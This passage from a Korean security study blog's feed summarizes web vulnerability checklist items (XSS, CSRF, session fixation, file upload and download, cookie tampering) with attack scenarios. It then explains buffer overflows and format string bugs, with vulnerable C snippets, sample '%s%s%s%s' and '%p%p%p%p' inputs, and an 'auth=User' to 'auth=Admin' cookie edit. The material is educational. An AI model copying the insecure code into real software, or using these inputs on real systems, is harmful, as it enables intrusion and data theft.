</ul>

<h3 id="취약점-시나리오-4">취약점 시나리오.</h3>
<ul>
  <li>XPath 로 구성된 로그인 페이지에서 인증을 우회할 수 있다.</li>
</ul>

<h2 id="8-디렉터리-인덱싱">8. 디렉터리 인덱싱</h2>
<ul>
  <li>인덱스 파일로 지정한 파일이 존재하지 않거나, 디렉토리 리스팅을 허락하도록 설정했을 경우 디렉터리 리스트가 사용자에게 노출된다.</li>
  <li>URL에 디렉터리 명을 입력했을 때 디렉터리 목록을 확인할 수 있다.</li>
</ul>

<h3 id="취약점-시나리오-5">취약점 시나리오</h3>
<ul>
  <li>서버의 디렉토리 구조를 쉽게 파악할 수 있다.</li>
  <li>민감한 정보가 포함된 설정 파일이 노출될 수 있다.</li>
  <li>백업한 서버 코드가 노출될 수 있다.</li>
</ul>

<h2 id="9-정보-누출">9. 정보 누출</h2>

<h3 id="개인-정보-누출">개인 정보 누출</h3>
<ul>
  <li>사용자에게는 개인 정보의 일부만 보여주지만, 서버에서 개인정보 모두를 전송한다. 불필요한 정보까지 노출될 수 있다.</li>
</ul>

<h3 id="서버-정보-누출">서버 정보 누출</h3>
<ul>
  <li>서버 버전. 어떠한 WAS 을 쓰는지 확인할 수 있다.</li>
  <li>이러한 정보로 해당 버전에 취약점이 존재하는지 확인할 수 있다.</li>
</ul>

<h2 id="10-악성-콘텐츠">10. 악성 콘텐츠</h2>
<ul>
  <li>확장자를 제한하지 않아 악성 파일을 게시글에 업로드할 수 있다.</li>
</ul>

<h3 id="취약점-시나리오-6">취약점 시나리오</h3>
<ul>
  <li>피해자가 악성 파일을 다운로드 받고 실행시 악성 코드 감염 등 보안상 심각한 위험에 노출된다.</li>
</ul>

<h2 id="11-크로스사이트-스크립팅">11. 크로스사이트 스크립팅</h2>
<ul>
  <li>클라이언트 측 스크립트를 삽입하는 공격이다.</li>
  <li>클라이언트 측에서 악의적인 스크립트가 실행되게 하는 공격이다.</li>
</ul>

<h3 id="stored-xss">Stored XSS</h3>
<ul>
  <li>게시글, 게시판과 같은 곳에서 발생한다.</li>
</ul>

<h4 id="취약점-시나리오-7">취약점 시나리오</h4>
<ol>
  <li>공격자는 악의적인 스크립트를 삽입한 게시글을 작성한다.</li>
  <li>방문자가 악성 게시글에 방문하면 사용자 브라우저에서 악성 스크립트가 동작하여 악의적인 행위를 수행한다. ( 쿠키 세션 ID값을 공격자 서버로 전송 )</li>
</ol>

<h3 id="reflected-xss">Reflected XSS</h3>
<ul>
  <li>사용자의 요청 파라미터 값을 그대로 보여주는 페이지에서 발생한다.</li>
</ul>

<h4 id="취약점-시나리오-8">취약점 시나리오</h4>
<ol>
  <li>공격자는 악성 스크립트를 삽입한 악성 링크를 만든다.</li>
  <li>사용자가 악성 링크를 클릭하도록 유도한다.</li>
  <li>사용자가 악성 링크를 클릭하여 들어가면 삽입한 악성 스크립트가 사용자 브라우저에서 동작하여 악의적인 행위를 수행한다. (키로거 삽입, 세션 ID 값 탈취)</li>
</ol>

<h2 id="12-약한-문자열-강도">12. 약한 문자열 강도</h2>
<ul>
  <li>인증 정보( 로그인 비밀번호 )의 등록 또는 변경 시 해당 값의 복잡성을 점검하지 않아 공격자가 쉽게 인증정보를 유추할 수 있다.</li>
</ul>

<h3 id="취약점-시나리오-9">취약점 시나리오</h3>
<ul>
  <li>공격자는 흔히 사용되는 비밀번호를 추측하여 무단으로 타 사용자의 계정으로 접속하는 악의적인 행위를 수행한다.</li>
</ul>

<h2 id="13-불충분한-인증">13. 불충분한 인증</h2>
<ul>
  <li>중요한 페이지에 접근할 때 추가 인증기능이 구현되어 있지 않아 인증우회 문제가 발생할 수 있다.</li>
  <li>인증 기능 미구현.</li>
</ul>

<h3 id="취약점-시나리오-10">취약점 시나리오</h3>
<ul>
  <li>URL을 통해 인증을 우회하여 중요 정보 페이지에 접근할 수 있다.</li>
</ul>

<h2 id="14-취약한-패스워드-복구">14. 취약한 패스워드 복구</h2>
<ul>
  <li>패스워드를 복구 기능이 적절히 구현되어 있지 않아 공격자는 사용자의 비밀번호 획득 및 변경이 가능하다.</li>
</ul>

<h3 id="취약점-시나리오-11">취약점 시나리오</h3>
<ul>
  <li>패스워드 복구 로직( 패스워드 찾기 등)으로 공격자가 불법적으로 다른 사용자의 패스워드를 획득, 병경할 수 있다.</li>
</ul>

<h2 id="15-csrf">15. CSRF</h2>
<ul>
  <li>사용자가 임의의 요청을 보내도록하는 공격이다.</li>
  <li>즉 사용자는 자신도 모르게 임의의 요청을 보내게 된다.</li>
  <li>주로 XSS 공격과 같이 CSRF공격을 진행한다.</li>
</ul>

<h3 id="취약점-시나리오-12">취약점 시나리오</h3>
<ol>
  <li>공격자는 XSS 취약점을 이용하여 악의적인 요청을 보내는 게시글을 작성한다.</li>
  <li>사용자가 악성 게시글에 방문하면 자신도 모르게 서버로 악의적인 요청을 보내게된다.</li>
</ol>

<h2 id="17-불충분한-인가">17. 불충분한 인가</h2>
<ul>
  <li>사용자가 권한이 없는 데이터에 접근 및 수정이 가능하다.</li>
  <li>권한 검사 기능 미구현.</li>
</ul>

<h3 id="취약점-시나리오-13">취약점 시나리오</h3>
<ul>
  <li>무단으로 다른 사용자의 게시글을 수정한다.</li>
  <li>무단으로 다른 사용자의 계정 정보를 수정한다.</li>
</ul>

<h2 id="18-불충분한-세션-만료">18. 불충분한 세션 만료</h2>
<ul>
  <li>세션의 만료 기간을 설정하지 않아 로그아웃 하기 전까지 계속 같은 세션을 이용한다.</li>
</ul>

<h3 id="취약점-시나리오-14">취약점 시나리오</h3>
<ul>
  <li>공격자에게 한번이라도 세션 ID값을 탈취당하면 공격자는 정상적인 사용자로 위장하여 웹 서버에 악의적인 행위를 수행 할 수 있다.</li>
</ul>

<h2 id="19-세션-고정">19. 세션 고정</h2>
<ul>
  <li>로그인 전과 로그인 후의 세션 ID값이 동일한 취약점이다.</li>
  <li>즉 서버에서 세션 ID값을 새로 발급해주는 것이 아닌 기존 유저가 가지고 있는 세션 ID값을 이용하여 로그인 여부를 확인한다.</li>
</ul>

<h3 id="취약점-시나리오-15">취약점 시나리오</h3>
<ol>
  <li>Reflected XSS 취약점을 이용하여 로그인 페이지에 스크립트를 사용하여 피해자의 쿠키 세션 ID값을 공격자 세션 ID 값으로 바꾼다.</li>
  <li>피해자가 악성 링크를 이용하여 로그인을 하여도 세션 ID값이 바뀌지 않아 공격자는 피해자로 로그인 인증우회 한다.</li>
  <li>이렇게 로그인을 우회하여 피해자의 정보 탈취 및 권한 우회가 가능하다.</li>
</ol>

<h2 id="20-자동화-공격">20. 자동화 공격</h2>
<ul>
  <li>매크로를 이용하여 게시글 작성 또는 로그인이 가능한 취약점이다.</li>
</ul>

<h3 id="취약점">취약점</h3>
<ul>
  <li>매크로로 게시글을 작성 요청을 무단으로 보내어 게시판을 도배할 수 있다.</li>
  <li>로그인 시도를 제한하지 않아 사전 대입 공격으로 사용자의 계정을 탈취할 수 있다.</li>
</ul>

<h2 id="22-파일-업로드">22. 파일 업로드</h2>
<ul>
  <li>임의의 파일을 업로드하고 실행 시키는 공격이다.</li>
  <li>악의적인 웹 쉘 파일을 업로드 및 실행하여 서버에 치명적인 영향을 미칠 수 있다.</li>
</ul>

<h3 id="취약점-시나리오-16">취약점 시나리오</h3>
<ol>
  <li>공격자는 서버에 웹 쉘 파일을 업로드한다.</li>
  <li>공격자는 웹 쉘 파일을 실행시켜 서버에서 민감한 파일 추출할 수 있다. (db 계정 정보, 웹 서버 코드)</li>
</ol>

<h2 id="23-파일-다운로드">23. 파일 다운로드</h2>
<ul>
  <li>서버의 임의의 파일을 다운로드 받는 공격이다.</li>
  <li>서버의 다운로드 페이지가 구현되어 있을 때 발생한다. (../down?file=test.png)</li>
  <li>file traversal 취약점을 이용하여 서버의 민감한 정보를 탈취할 수 있다.</li>
</ul>

<h3 id="취약점-시나리오-17">취약점 시나리오</h3>
<ol>
  <li>공격자는 file traversal 공격을 이용하여 서버의 민감한 파일을 탈취한다.</li>
  <li>공격자는 이러한 민감한 파일을 분석하여 또 다른 취약점을 발견할 수 있다.</li>
</ol>

<h2 id="24-관리자-페이지-노출">24. 관리자 페이지 노출</h2>
<ul>
  <li>유추하기 쉬운 URL을 통해 관리자 페이지 접근이 가능한 취약점이다.</li>
  <li>admin, manager, phpMyAdmin</li>
</ul>

<h3 id="취약점-시나리오-18">취약점 시나리오</h3>
<ul>
  <li>비인가자가 관리자 메뉴에 무단으로 접근하여 악의적인 행위(웹 사이트 변조)를 수행할 수 있다.</li>
</ul>

<h2 id="27-데이터-평문-전송">27. 데이터 평문 전송</h2>
<ul>
  <li>서버와 클라이언트 간 암호화 통신이 이루어져 있지않아 민감한 정보가 외부로 노출될 수 있다.</li>
</ul>

<h3 id="취약점-시나리오-19">취약점 시나리오</h3>
<ul>
  <li>MIMT(중간자) 공격을 이용하여 사용자가 요청한 민감한 정보를 탈취 및 도용 할 수 있다. (계정 정보)</li>
</ul>

<h2 id="28-쿠키-변조">28. 쿠키 변조</h2>
<ul>
  <li>쿠키 값을 변조하여 권한을 우회하거나 다른 사용자로 위장하는 취약점을 말한다.</li>
</ul>

<h3 id="취약점-시나리오-20">취약점 시나리오</h3>
<ul>
  <li>공격자가 쿠키 값을 변경하여 관리자 권한을 획득할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>변경 전
Cookie
auth=User

변경 후
Cookie
auth=Admin
</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="주통기반" /><summary type="html"><![CDATA[주통기반 Web 취약점 시나리오를 정리해보자]]></summary></entry><entry><title type="html">Buffer Overflow 와 Format String Bug</title><link href="http://localhost:4000/BoF%EC%99%80FSB/" rel="alternate" type="text/html" title="Buffer Overflow 와 Format String Bug" /><published>2023-06-30T00:00:00+09:00</published><updated>2023-06-30T23:13:00+09:00</updated><id>http://localhost:4000/BoF%EC%99%80FSB</id><content type="html" xml:base="http://localhost:4000/BoF%EC%99%80FSB/"><![CDATA[<h2 id="프로세스-구조">프로세스 구조</h2>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/69baa543-8e82-4d24-bd92-5683a77d051b" alt="Pasted image 20230630182437" /></p>

<h3 id="code">CODE</h3>
<ul>
  <li>TEXT 영역이라고도 한다.</li>
  <li>실행할 프로그램의 코드가 저장되어 있다.</li>
  <li>CPU는 코드 영역에 저장된 명령어를 하나씩 가져가서 처리한다.</li>
</ul>

<h3 id="data">DATA</h3>
<ul>
  <li>프로그램의 전역 변수와 정적(static) 변수가 저장되는 영역이다.</li>
  <li>프로그램의 시작과 함께 할당되며, 프로그램이 종료되면 소멸한다.</li>
</ul>

<h3 id="heap">HEAP</h3>
<ul>
  <li>사용자가 직접 관리할 수 있는 메모리 영역이다.</li>
  <li>사용자에 의해 동적으로 메모리 공각이 할당되고 해제된다.</li>
  <li>메모리의 낮은 주소에서 높은 주소로 할당된다.</li>
  <li>c 언어의 malloc</li>
</ul>

<h3 id="stack">STACK</h3>
<ul>
  <li>함수의 호출과 함께 할당되며, 함수의 호출이 완료되면 소멸한다.</li>
  <li>함수의 호출과 관계된 지역변수와 매개변수가 저장된다.</li>
  <li>메모리의 높은 주소에서 낮은 주소로 할당된다.</li>
</ul>

<h3 id="stack-할당-예시">STACK 할당 예시</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ed4d540f-8c6d-4225-98ad-41efe673736f" alt="Pasted image 20230630202730" /></p>

<h2 id="buffer-overflow">Buffer Overflow</h2>
<ul>
  <li>할당된 버퍼의 크기를 초과한 데이터가 입력되어 인접한 다른 메모리 정보를 덧쓰는 현상이다.</li>
  <li>프로세스가 데이터를 버퍼에 저장할 때 프로그래머가 지정한 곳 바깥에 저장하는 것을 의미한다.</li>
  <li>할당받은 공간보다 더 많은 입력을 받아 발생한다.</li>
  <li>return address 를 변경하여 악의적인 코드를 실행시킬 수 있다.</li>
</ul>

<h3 id="bof-발생-예시">BoF 발생 예시</h3>
<ul>
  <li>32 bit 시스템이라고 가정한다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>입력 전.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5c1f1895-e12f-4ef6-bd0e-fd0d0ea01b1c" alt="Pasted image 20230630211112" /></li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">AAAAAAAAAAAAAAAAAA</code> 입력을 한다</p>
  </li>
  <li>
    <p>입력 후.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2d36546a-6267-422b-a102-f6c57b67369e" alt="Pasted image 20230630211134" /></p>
  </li>
  <li>할당 받은 버퍼 크기를 넘는 입력을 받아 인접한 메모리의 정보가 덧씌워졌다.</li>
  <li>Buffer Overflow 공격을 통해 리턴 주소를 공격자 마음대로 수정할 수 있다.</li>
</ul>

<h2 id="포맷-스트링--fsb-">포맷 스트링 ( FSB )</h2>
<ul>
  <li>Format String Bug</li>
  <li>입력 값에 포맷 스트링을 넣으면 문자로 취급하는게 아닌, 서식 문자로 취급하여 취약점이 일어날 수 있다.</li>
  <li>포맷팅 문자열에서 발생한다.</li>
  <li>메모리 안의 정보를 누출시킬 수 있다. 즉 스택 메모리의 정보를 얻을 수 있다.</li>
  <li>잘못된 메모리 주소에 접근을 시도하여 프로그램을 중단시킬 수 있다.</li>
  <li>%n 을 이용하여 스택 값을 변조할 수 있다. 즉 리턴 주소 값을 수정하여 악의적인 코드를 실행시킬 수 있다.</li>
</ul>

<h3 id="예시">예시</h3>
<ul>
  <li>코드</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
	<span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>입력</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./example "%s%s%s%s"
</code></pre></div></div>

<ul>
  <li>
    <p>스택에 있는 메모리 정보를 노출 시킨다.</p>
  </li>
  <li>
    <p>입력</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./example "%p%p%p%p"
</code></pre></div></div>

<ul>
  <li>실행하는 순간의 스택에 있는 메모리 주소를 출력해준다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://blue-pxngxxn.tistory.com/entry/%EC%B7%A8%EC%95%BD%EC%A0%90%EA%B3%B5%EA%B2%A9-Format-String-Attack-FSB">Format String Attack (FSB) (tistory.com)</a></li>
  <li><a href="http://www.tcpschool.com/c/c_memory_stackframe">코딩의 시작, TCP School</a></li>
  <li><a href="http://www.tcpschool.com/c/c_memory_structure">코딩의 시작, TCP School</a></li>
  <li><a href="https://zangzangs.tistory.com/107">프로세스 메모리 구조 (코드, 데이터, 스텍, 힙) (tistory.com)</a></li>
  <li><a href="https://ko.wikipedia.org/wiki/%EB%B2%84%ED%8D%BC_%EC%98%A4%EB%B2%84%ED%94%8C%EB%A1%9C">버퍼 오버플로 - 위키백과, 우리 모두의 백과사전 (wikipedia.org)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="BOF" /><category term="FSB" /><summary type="html"><![CDATA[bof 와 fsb 에 대하여 알아보자.]]></summary></entry></feed>